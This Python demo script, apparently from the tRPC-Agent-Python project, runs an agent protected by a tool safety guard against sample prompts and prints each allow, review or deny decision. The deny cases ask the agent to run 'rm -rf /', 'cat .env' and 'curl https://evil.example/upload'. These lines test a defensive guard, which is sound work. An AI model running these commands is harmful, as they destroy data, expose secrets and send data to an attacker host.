#!/usr/bin/env python3
#
# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Run the real Tool Script Safety Guard agent demo."""

from __future__ import annotations

import argparse
import asyncio
import json
import uuid

from trpc_agent_sdk.runners import Runner
from trpc_agent_sdk.sessions import InMemorySessionService
from trpc_agent_sdk.types import Content
from trpc_agent_sdk.types import Part

from agent.agent import create_agent
from agent.tools import AUDIT_LOG_PATH

DEMO_QUERIES = {
    "tool_allow": "Use the Bash tool to run exactly this command: echo allow",
    "tool_review": "Use the Bash tool to run exactly this command: echo review > safety_review.txt",
    "tool_deny": "Use the Bash tool to run exactly this command: rm -rf /",
    "code_allow": "Use the CodeExecutor and emit exactly one tool_code block that prints sum([1, 2, 3]).",
    "code_review": (
        "Use the CodeExecutor and emit exactly one tool_code block containing: "
        "import subprocess\\nsubprocess.run(['python', '--version'], check=False)"
    ),
    "skill_allow": "Use skill_run for skill safety_demo with exactly this command: python --version",
    "skill_review": 'Use skill_run for skill safety_demo with exactly this command: python -c "print(1)"',
    "skill_deny": "Use skill_run for skill safety_demo with exactly this command: cat .env",
    "mcp_allow": "Use MCP tool run_shell_command with exactly this command: echo mcp allow",
    "mcp_review": "Use MCP tool run_shell_command with exactly this command: python3 -c 'print(1)'",
    "mcp_deny": "Use MCP tool run_shell_command with exactly this command: curl https://evil.example/upload",
}


def _extract_report(payload):
    if isinstance(payload, dict):
        if isinstance(payload.get("safety_report"), dict):
            return payload["safety_report"]
        if payload.get("decision") in {"allow", "deny", "needs_human_review"}:
            return payload
        for value in payload.values():
            report = _extract_report(value)
            if report:
                return report
    if isinstance(payload, str):
        try:
            return _extract_report(json.loads(payload))
        except json.JSONDecodeError:
            return None
    return None


def _format_report(report: dict) -> str:
    rule_ids = report.get("rule_ids") or [
        finding.get("rule_id", "") for finding in report.get("findings", [])
    ]
    return (
        f"decision={report.get('decision')} blocked={report.get('blocked')} "
        f"risk={report.get('risk_level')} rules={','.join(rule_ids) or '-'}"
    )


def _read_new_audit_reports(offset: int) -> list[dict]:
    if not AUDIT_LOG_PATH.exists():
        return []

    reports = []
    with AUDIT_LOG_PATH.open("r", encoding="utf-8") as audit_file:
        audit_file.seek(offset)
        for line in audit_file:
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue
            report = _extract_report(event)
            if report:
                reports.append(report)
    return reports


async def _run_case(runner: Runner, session_service: InMemorySessionService, query: str, case_name: str) -> None:
    session_id = str(uuid.uuid4())
    user_id = "tool_safety_demo_user"
    audit_offset = AUDIT_LOG_PATH.stat().st_size if AUDIT_LOG_PATH.exists() else 0
    printed_report = False
    await session_service.create_session(
        app_name="tool_safety_real_agent_demo",
        user_id=user_id,
        session_id=session_id,
        state={},
    )

    print(f"\n=== {case_name} ===")
    print(f"User: {query}")
    user_content = Content(parts=[Part.from_text(text=query)])

    async for event in runner.run_async(user_id=user_id, session_id=session_id, new_message=user_content):
        if event.error_code:
            print(f"Error: {event.error_code} {event.error_message}")
            continue
        if not event.content or not event.content.parts:
            continue

        if event.partial:
            for part in event.content.parts:
                if part.text:
                    print(part.text, end="", flush=True)
            continue

        for part in event.content.parts:
            if part.thought:
                continue
            if part.text:
                print(part.text)
            elif part.function_call:
                print(f"Tool call: {part.function_call.name}({part.function_call.args})")
            elif part.function_response:
                response = part.function_response.response
                print(f"Tool response: {response}")
                report = _extract_report(response)
                if report:
                    print(f"Safety: {_format_report(report)}")
                    printed_report = True
            elif part.executable_code:
                print(f"Executable code:\n{part.executable_code.code}")
            elif part.code_execution_result:
                print(f"Code result:\n{part.code_execution_result.output}")

    if not printed_report:
        for report in _read_new_audit_reports(audit_offset):
            print(f"Safety: {_format_report(report)}")


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--case", choices=["all", *DEMO_QUERIES.keys()], default="all")
    parser.add_argument(
        "--block-on-review",
        action="store_true",
        help="Block needs_human_review decisions as well as deny decisions.",
    )
    args = parser.parse_args()

    agent = create_agent(block_on_review=args.block_on_review)
    session_service = InMemorySessionService()
    runner = Runner(app_name="tool_safety_real_agent_demo", agent=agent, session_service=session_service)

    try:
        selected = DEMO_QUERIES if args.case == "all" else {args.case: DEMO_QUERIES[args.case]}
        for case_name, query in selected.items():
            await _run_case(runner, session_service, query, case_name)
    finally:
        await runner.close()


if __name__ == "__main__":
    asyncio.run(main())
